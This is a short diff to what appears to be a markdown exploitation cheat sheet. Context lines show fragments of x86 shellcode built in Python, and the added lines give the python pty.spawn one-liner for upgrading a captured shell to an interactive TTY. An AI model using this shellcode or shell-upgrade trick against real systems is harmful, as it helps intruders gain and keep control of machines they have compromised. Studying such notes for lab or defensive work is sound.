@@ -133,3 +133,8 @@ shellcode += "\x57\x5c"                     # push edi; pop esp
 shellcode += "\x81\xe4\xf0\xff\xff\xff"    # align the stack: AND esp,0xFFFFFFF0
 ...
 ```
+
+# Good ol TTY Shell
+```
+python -c 'import pty; pty.spawn("/bin/sh")'
+```
